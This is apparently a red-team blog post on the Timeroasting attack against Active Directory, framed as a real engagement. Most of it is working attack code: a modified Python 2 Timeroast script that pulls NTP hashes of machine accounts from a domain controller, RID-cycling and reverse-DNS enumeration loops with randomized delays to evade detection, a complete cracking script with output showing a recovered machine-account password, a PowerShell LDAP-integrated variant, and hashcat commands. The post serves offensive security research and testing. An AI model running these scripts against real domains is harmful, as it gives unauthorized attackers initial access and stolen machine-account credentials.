---
layout: post
title: "On the Applicability of the Timeroasting Attack"
date: 2024-12-08 10:00:00 +0300
author: snovvcrash
tags: [active-directory, timeroasting]
---

Lately I've had an opportunity to experiment with the Timeroasting on an engagement, so here are my thoughts on the applicability of the attack in real life conditions with some examples along the way.

<!--cut-->

[![banner.png](/assets/images/applicability-of-the-timeroasting-attack/banner.png)](/assets/images/applicability-of-the-timeroasting-attack/banner.png)
{:.center-image}

* TOC
{:toc}

# Intro

[Timeroasting](https://www.secura.com/uploads/whitepapers/Secura-WP-Timeroasting-v3.pdf) is a *relatively* new attack vector (by [@SecuraBV](https://x.com/securabv)) in Active Directory environments which lets an **unauthenticated** attacker to query a DC for an NTP Response encrypted with the NT hash of a machine account for every computer in the domain by RID. It is possible due to the ability of abusing the [[MS-SNTP]](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sntp/8106cb73-ab3a-4542-8bc8-784dd32031cc) extension designed to prevent AitM attacks on computers' clock synchronization procedure.

So how can the attacker make use of the NTP Response blobs encrypted with NT hashes of machine accounts that are meant to be derived from **random** passwords? The first thing that comes to mind is the possible existence of Pre-created / Pre-Windows 2000 Computer Accounts in client's AD. Two great blog posts by [Oddvar Moe](https://x.com/Oddvarmoe) and [Garrett Foster](https://x.com/garrfoster), which prove that not all the machine accounts' passwords (under certain circumstances) are necessarily random, are:

- [Diving into Pre-Created Computer Accounts / TrustedSec](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts)
- [Diving Deeper Into Pre-created Computer Accounts / Optiv](https://www.optiv.com/insights/source-zero/blog/diving-deeper-pre-created-computer-accounts)

As long as the attacker possesses a list of sAMAccountNames of all the machines in Active Directory, she can effectively brute force the SNTP hashes hoping to come across a "pre2k" computer or a reset machine account whose password has not yet been re-rolled to a truly random one. With this in mind Timeroasting attack has proven itself to be a powerful method for gaining initial authenticated access in AD environments and/or obtaining control over an auxiliary machine account to be used in other attack chains (RBCD / AD CS abuses / whatever) when MAQ equals zero.

*This blog post is inspired by [Alex Neff's](https://x.com/al3x_n3ff) [thread](https://threadreaderapp.com/thread/1863255831036215441.html) on X, where he presented [the Timeroast module for NetExec](https://github.com/Pennyw0rth/NetExec/pull/311).*

# Timeroasting

> *"You hack people. I hack time."* (Whiterose)

## Unauthenticated

Let's jump staight to a real life case: my team gained access to a legacy Linux box with network visibility of a client's domain controller, but at that point we still did not have any valid AD credentials to process with the enumeration.

The Linux box had only Python 2 installed as well as operating from a DNS back connect didn't help too much with bringing a self contained Python 3 [`timeroast.py`](https://github.com/SecuraBV/Timeroast/blob/main/timeroast.py) executable. Due to the fact that we're dealing with NTP protocol which uses UDP transport, the attack cannot be performed over a SOCKS proxy. Thus, I modified (to support Python 2) and minified (used awesome [python-minifier](https://github.com/dflook/python-minifier)) the original script a bit:

```python
#!/usr/bin/python2
from binascii import hexlify,unhexlify
from select import select
from socket import socket,AF_INET,SOCK_DGRAM
from struct import pack,unpack
from time import time
PREFIX=unhexlify('db0011e9000000000001000000000000e1b8407debc7e50600000000000000000000000000000000e1b8428bffbfcd0a')
def fmt(rid,hashval,salt):return str(rid)+':'+'$sntp-ms$'+hexlify(hashval)+'$'+hexlify(salt)
def roast(dc_host,rids,rate,giveup_time,old_pwd,src_port):
    D=src_port;E=2**31 if old_pwd else 0;A=socket(AF_INET,SOCK_DGRAM)
    try:A.bind(('0.0.0.0',D))
    except Exception as I:raise Exception('Error: %s'%(str(D),str(I)))
    J=1./rate;F=time();G=set();K=iter(rids)
    while time()<F+giveup_time:
        H=next(K,None)
        if H is not None:L=PREFIX+pack('<I',H^E)+'\x00'*16;A.sendto(L,(dc_host,123))
        M,N,N=select([A],[],[],J)
        if M:
            B=A.recvfrom(120)[0]
            if len(B)==68:
                O=B[:48];C=unpack('<I',B[-20:-16])[0]^E;P=B[-16:]
                if C not in G:G.add(C);yield(C,P,O)
                F=time()
for(A,B,C)in roast('192.168.1.11',xrange(1,2**31),20,100,False,0):print(fmt(A,B,C))
```

Having grabbed around 2k machine accounts we then thought of a way of getting the computers names. There're a couple of options here.

The first one being a null authentication RPC endpoint to cycle through the RIDs (can be done with `rpcclient` or `lookupsid.py` from [Impacket](https://github.com/fortra/impacket)):

```terminal?prompt=$
$ rpcclient -U '%' 192.168.1.11 -c lsaquery
Domain Name: NIGHTCITY
Domain Sid: S-1-5-21-2513662962-556311701-4231341873

$ for rid in `seq 1000 10000`
for> do proxychains4 rpcclient -U '%' 192.168.1.11 -c "lookupsids S-1-5-21-2513662962-556311701-4231341873-$rid" |& grep -v unknown | grep '\$ ('
for> sleep $((3+RANDOM % 5))
for> done
S-1-5-21-2513662962-556311701-4231341873-1000 NIGHTCITY\PRIDE$ (1)
S-1-5-21-2513662962-556311701-4231341873-1135 NIGHTCITY\GUTS$ (1)
S-1-5-21-2513662962-556311701-4231341873-1136 NIGHTCITY\CRUSHER$ (1)
S-1-5-21-2513662962-556311701-4231341873-1150 NIGHTCITY\ubuntu$ (1)
S-1-5-21-2513662962-556311701-4231341873-1182 NIGHTCITY\SATARA$ (1)
S-1-5-21-2513662962-556311701-4231341873-1199 NIGHTCITY\DESKTOP-EUM3L4L$ (1)
S-1-5-21-2513662962-556311701-4231341873-1200 NIGHTCITY\gmsa01$ (1)
S-1-5-21-2513662962-556311701-4231341873-1205 NIGHTCITY\SRV-2012R2$ (1)
S-1-5-21-2513662962-556311701-4231341873-1206 NIGHTCITY\SRV-2008R2$ (1)
S-1-5-21-2513662962-556311701-4231341873-1208 NIGHTCITY\LEXINGTON$ (1)
...
```

Note that RID Cycling can easily be performed [in combination with NTLM Relay](https://x.com/snovvcrash/status/1506286522655461386) 😉

```terminal?prompt=$
$ proxychains4 lookupsid.py -no-pass -domain-sids 192.168.1.11 | grep '\$ (SidTypeUser'
```

However, it wasn't the case for us, so we headed towards the second obvious way to get the machine names — reverse DNS lookups for a couple of internal subnets:

```bash
#!/usr/bin/env bash
for subnet in {1..10}; do
    for i in `prips 192.168.$subnet.0/24`; do
        proxychains4 dig +tcp +noall +answer -x $i @192.168.1.11 |& grep PTR
        # OR directly on client when no dig/nslookup is available: getent -s hosts:dns hosts $i
        sleep $((3 + RANDOM % 5))
    done
done
```

Now, when we collected the hostnames, we can either compile the beta version of hashcat to utilize [the `-m31300` mode](https://github.com/hashcat/hashcat/issues/3629):

```terminal?prompt=$
$ git clone https://github.com/hashcat/hashcat && cd hashcat
$ git checkout 5236f3bd7 && make

$ python3
>>> with open('hostnames.txt') as f:
...   hostnames = f.read().splitlines()
>>> with open('hostnames.txt', 'w') as f:
...   f.writelines(f'{x.lower()[:14]}\n' if len(x) >= 15 else f'{x.lower()[:-1]}\n' for x in hostnames)
...

$ ./hashcat -m31300 -O -a0 -w3 --session=sntp -o sntp.out sntp.in hostnames.txt
```

Or use a trivial Python script. Imho, hashcat is an overkill for such a small-wordlist brute force, so I went for the second option:

```python
#!/usr/bin/env python3
import queue
import hashlib
import threading
from multiprocessing import cpu_count
from argparse import ArgumentParser

def brute_force_worker(hash_queue, wordlist, result_queue):
    while not hash_queue.empty():
        try:
            line = hash_queue.get_nowait()
            user, hash_type, hash_value, salt = parse_hash_entry(line)

            for password in wordlist:
                nthash_bytes = hashlib.new('md4', password.encode('utf-16le')).digest()
                salt_bytes = bytes.fromhex(salt)

                if hashlib.md5(nthash_bytes + salt_bytes).hexdigest() == hash_value:
                    result_queue.put((user, password))
                    break

        except queue.Empty:
            break

def parse_hash_entry(line):
    try:
        user, hash_entry = line.split(':', 1)
        hash_type, hash_value, salt = hash_entry.split('$')[1:]
        return user, hash_type, hash_value, salt
    except ValueError as e:
        print(f'[!] Error parsing line: {line}')

def main(hashes_file, wordlist_file, thread_count=4):
    with open(hashes_file) as f:
        hashes = f.read().splitlines()

    with open(wordlist_file) as f:
        wordlist = f.read().splitlines()

    hash_queue = queue.Queue()
    for line in hashes:
        hash_queue.put(line.strip())

    result_queue = queue.Queue()

    threads = []
    for _ in range(thread_count):
        thread = threading.Thread(target=brute_force_worker, args=(hash_queue, wordlist, result_queue))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    while not result_queue.empty():
        user, password = result_queue.get()
        print(f'[+] {user}:{password}')

if __name__ == '__main__':
    parser = ArgumentParser()
    parser.add_argument('hashes_file', help='File containing hashes to crack')
    parser.add_argument('wordlist_file', help='File containing passwords to test')
    parser.add_argument('-t', '--threads', type=int, default=cpu_count(), help=f'Number of threads (default: {cpu_count()})')
    args = parser.parse_args()

    main(args.hashes_file, args.wordlist_file, args.threads)
```

On a default 4 cores Kali VM 2k wordlist brute force session took 4,5 sec (expected due to the low complexity of hashing algorithms) which gave the desired initial access computer account:

```terminal?prompt=$
$ wc -l sntp.in hostnames.txt
  1859 sntp.in
  1859 hostnames.txt
  3718 total
$ time python3 crack_sntp.py sntp.in hostnames.txt
[+] DESKTOP-EUM3L4L:desktop-eum3l4
python3 crack_sntp.py sntp.in hostnames.txt  4.52s user 0.14s system 103% cpu 4.521 total
```

## Authenticated

When I first saw the [PowerShell port](https://github.com/SecuraBV/Timeroast/blob/main/timeroast.ps1) of the Timeroast script, I instantly thought of its authenticated use case: we simply need to integrate an LDAP query to get all the required information within a single script run:

```powershell
function Invoke-Timeroast()
{
    param(
        [Parameter(Mandatory=$true, Position=0)]
        [string]$Server,
        [int]$Rate = 50,
        [int]$Timeout = 60,
        [Uint16]$SourcePort
    )

    $ErrorActionPreference = "Stop"

    $NTP_PREFIX = [byte[]]@(0xdb,0x00,0x11,0xe9,0x00,0x00,0x00,0x00,0x00,0x01,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x40,0x7d,0xeb,0xc7,0xe5,0x06,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0xe1,0xb8,0x42,0x8b,0xff,0xbf,0xcd,0x0a)

    $ldapFilter = "(&(objectCategory=computer)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))"
    $searcher = New-Object DirectoryServices.DirectorySearcher
    $searcher.Filter = $ldapFilter
    $searcher.PropertiesToLoad.Add("samAccountName") | Out-Null
    $searcher.PropertiesToLoad.Add("objectSID") | Out-Null
    $results = $searcher.FindAll()

    if ($port -eq 0) {
        $client = New-Object System.Net.Sockets.UdpClient
    } else {
        $client = New-Object System.Net.Sockets.UdpClient($SourcePort)
    }

    $client.Client.ReceiveTimeout = [Math]::floor(1000 / $Rate)
    $client.Connect($Server, 123)

    $i = 0
    $ridToSamAccountName = @{}
    $timeoutTime = (Get-Date).AddSeconds($Timeout)

    while ((Get-Date) -lt $timeoutTime) {
        if ($i -lt $results.Count) {
            $sid = New-Object System.Security.Principal.SecurityIdentifier($results[$i].Properties["objectsid"][0], 0)
            $rid = [UInt32]$sid.Value.Split('-')[-1]
            $query = $NTP_PREFIX + [BitConverter]::GetBytes($rid) + [byte[]]::new(16)
            [void]$client.Send($query, $query.Length)
            $ridToSamAccountName[$rid] = $results[$i].Properties["samaccountname"][0].Trim("$")
            $i++
        }

        try {
            $reply = $client.Receive([ref]$null)
            
            if ($reply.Length -eq 68) {
                $salt = [byte[]]$reply[0..47]
                $md5Hash = [byte[]]$reply[-16..-1]
                $answerRid = [BitConverter]::ToUInt32($reply[-20..-16], 0)

                $hexSalt = [BitConverter]::ToString($salt).Replace("-", "").ToLower()
                $hexMd5Hash = [BitConverter]::ToString($md5Hash).Replace("-", "").ToLower()
                $hashcatHash = "{0}:`$sntp-ms`${1}`${2}" -f $ridToSamAccountName[$answerRid], $hexMd5Hash, $hexSalt

                Write-Output $hashcatHash

                $timeoutTime = (Get-Date).AddSeconds($Timeout)
            }
        }
        catch [System.Management.Automation.MethodInvocationException]
        { }
    }

    $client.Close()
}
```

![![timeroast.ps1.png](/assets/images/applicability-of-the-timeroasting-attack/timeroast.ps1.png)](/assets/images/applicability-of-the-timeroasting-attack/timeroast.ps1.png)
{:.center-image}

PowerShell Timeroasting Demo
{:.quote}

# Bonus: Using NT Hashes as a Wordlist

Given the fact that *most of the time* machine account passwords **are** random, we can go for Pass-the-Hash by trying to brute force the NTP Response into NT hashes using a hex wordlist, e. g. [Pwned Passwords as NTLM Hashes](https://www.troyhunt.com/pwned-passwords-now-as-ntlm-hashes/), [ntlm.pw](https://ntlm.pw/), etc.

We already have examples of modifying known brute force attacks to reduce number of cryptographic transformations in order to find hashes instead of plaintext creds — like [@mohemiv](https://github.com/mohemiv) [shared it here for Kerberoasting](https://github.com/hashcat/hashcat/pull/2607#issuecomment-850653034).

But in fact, we don't even have to bring any new modules to hashcat because [the hashing scheme](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sntp/83010bc2-35c1-451f-b3ba-9cf9e0211e3b) is just salted MD5:

```
MD5(MD4(UTF-16LE(password)) || NTP-response)
==
MD5(NT-hash || NTP-response)
```

Hashcat's mode 10 `md5($pass.$salt)` can be re-used in pure kernel setting (however, [optimized kernel will refuse it due to hardcoded salt length](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#what_is_the_maximum_supported_salt_length_for_optimized_kernels)) providing `--hex-wordlist` and `--hex-salt` switches to achive our goal:

```terminal?prompt=$
$ hashcat -m10 -a0 --session=sntp -o sntp.out sntp.in nthashes.txt --hex-wordlist --hex-salt
```

# Outro

From my point of view, the main application of the Timeroasting attack is another (more stealthier) way of performing [pre2k](https://github.com/garrettfoster13/pre2k) spray — in an "offline" manner and with no redundant authentication attempt events.

In organizations with hundreds of thousands of computers and therefore hundreds of thousands of machine accounts, this type of attack has a high risk of successful reproduction.
